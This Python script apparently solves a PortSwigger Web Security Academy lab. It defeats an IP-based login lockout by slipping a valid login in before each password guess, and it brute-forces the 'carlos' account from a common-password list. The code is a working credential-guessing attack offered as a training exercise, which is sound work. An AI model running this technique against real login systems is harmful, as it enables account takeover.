#!/usr/bin/env python3
"""
Broken brute-force protection, IP block
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 04-broken-brute-force-protection-ip-block.md

What this does:
    The login endpoint blocks the source IP after three consecutive failed
    attempts, but a successful login resets that counter entirely. For each
    candidate password, this script first sends a guaranteed-successful login
    with the known-good credentials (wiener:peter) to reset the block counter,
    and only then sends the real guess against the target account (carlos).
    This must run strictly sequentially -- concurrency would race the reset
    against the guess and let the block trigger anyway.

Usage:
    python 04-broken-brute-force-protection-ip-block.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]

TARGET_USER = "carlos"
VALID_USER = "wiener"
VALID_PASS = "peter"


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    found_pw = None

    for i, pw in enumerate(PASSWORDS):
        # Reset the IP block counter with a guaranteed-good login first.
        page = client.get(f"{lab_url}/login")
        client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": VALID_USER, "password": VALID_PASS
        })

        # Now the real guess against the target account.
        page = client.get(f"{lab_url}/login")
        resp = client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": TARGET_USER, "password": pw
        })

        if resp.status_code == 302 or "my-account" in getattr(resp.url, "path", ""):
            found_pw = pw
            print(f"[+] IP block bypass: found at attempt {i + 1}")
            break

        txt = resp.text.lower()
        if ("incorrect" not in txt and "invalid" not in txt
                and "blocked" not in txt and "too many" not in txt):
            check = client.get(f"{lab_url}/my-account")
            if check.status_code == 200 and TARGET_USER in check.text.lower():
                found_pw = pw
                print(f"[+] IP block bypass: found at attempt {i + 1}")
                break

        if (i + 1) % 20 == 0:
            print(f"[*] Tested {i + 1}/{len(PASSWORDS)}")

    if found_pw:
        print(f"[+] Credentials: {TARGET_USER}:{found_pw}")
        client.get(f"{lab_url}/login")
        page = client.get(f"{lab_url}/login")
        client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": TARGET_USER, "password": found_pw
        })
    else:
        print("[-] No password matched from the candidate list.")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
